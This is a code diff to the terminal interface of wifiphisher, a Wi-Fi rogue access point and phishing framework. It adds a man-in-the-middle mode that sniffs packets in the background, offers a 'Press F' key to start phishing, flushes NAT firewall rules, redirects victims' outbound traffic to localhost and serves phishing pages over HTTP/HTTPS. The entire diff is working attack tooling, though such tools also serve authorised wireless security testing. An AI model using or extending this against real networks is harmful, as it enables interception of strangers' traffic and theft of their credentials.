@@ -8,13 +8,17 @@ import os
 import re
 import time
 from collections import namedtuple
-from subprocess import check_output
+from subprocess import PIPE, Popen, check_output
 
 import wifiphisher.common.accesspoint as accesspoint
 import wifiphisher.common.constants as constants
 import wifiphisher.common.phishingpage as phishingpage
 import wifiphisher.common.recon as recon
 import wifiphisher.common.victim as victim
+
+# These are specific to the mitm argument
+from threading import Thread
+import wifiphisher.common.firewall as firewall
 
 # information for the main terminal
 MainInfo = namedtuple("MainInfo", constants.MAIN_TUI_ATTRS)
@@ -523,7 +527,7 @@ class TuiApSel(object):
         # show information until user presses Esc key
         while ap_info.key != 27:
             # display info will modifiy the key value
-            is_done = self.display_info(screen, ap_info)
+            is_done, show_template = self.display_info(screen, ap_info)
 
             if is_done:
                 # turn off access point discovery and return the result
@@ -830,10 +834,26 @@ class TuiMain(object):
         self.yellow_text = curses.color_pair(2) | curses.A_BOLD
         self.red_text = curses.color_pair(3) | curses.A_BOLD
 
+        # Start the packet sniffer asynchronously in the background
+        # if it fits the scenario
+        try:
+          info.pktSniffer.start()
+        except:
+          pass
+
         while True:
             # catch the exception when screen size is smaller than
             # the text length
-            is_done = self.display_info(screen, info)
+            is_done, show_template = self.display_info(screen, info)
+
+            if show_template:
+                # Gracefully shutdown the sniffer to free resources 
+                # and avoid issues with file writing
+                info.pktSniffer.stop()
+
+                screen.addstr(27, 0, "[*] Starting HTTP/HTTPS server at ports {} {}".format(str(constants.PORT), str(constants.SSL_PORT)), self.yellow_text)
+                initiate_mitm(info.phishinghttp, info.template, info.em)
+
             if is_done:
                 return
 
@@ -944,6 +964,7 @@ class TuiMain(object):
         accesspoint_instance.read_connected_victims_file()
 
         is_done = False
+        show_template = False
         screen.erase()
 
         _, max_window_length = screen.getmaxyx()
@@ -993,6 +1014,9 @@ class TuiMain(object):
                     ['tail', '-5', '/tmp/wifiphisher-http-requests.txt'])
                 self.print_http_requests(screen, 14, http_output)
                 self.print_http_requests_sniffer(screen, 14, http_output)
+            # Print the button prompt to initiate phishing when the MITM scenario is used
+            if info.args.mitminterface:
+                screen.addstr(25, 0, "Press F to initiate phishing scenario", self.blue_text)
         except curses.error:
             pass
 
@@ -1000,11 +1024,14 @@ class TuiMain(object):
         if screen.getch() == 27:
             is_done = True
 
+        if info.args.mitminterface and screen.getch() == ord("f"):
+            show_template = True
+
         if info.phishinghttp.terminate and info.args.quitonsuccess:
             is_done = True
 
         screen.refresh()
-        return is_done
+        return is_done, show_template
 
 
 def display_string(w_len, target_line):
@@ -1035,3 +1062,21 @@ def line_splitter(num_of_words, line):
     pieces = line.split()
     return (" ".join(pieces[i:i + num_of_words])
             for i in range(0, len(pieces), num_of_words))
+
+def initiate_mitm(phishinghttp, template, em):
+
+    fw = firewall.Fw()
+
+    # Clear the current NAT firewall rules and set new rules to
+    # redirect egress traffic to localhost
+    fw.on_exit()
+    fw.redirect_requests_localhost()
+
+    # Start the HTTP server in a background thread
+    webserver = Thread(
+        target=phishinghttp.runHTTPServer,
+        args=(constants.NETWORK_GW_IP, constants.PORT, constants.SSL_PORT, template, em))
+    webserver.daemon = True
+    webserver.start()
+
+    time.sleep(1.5)
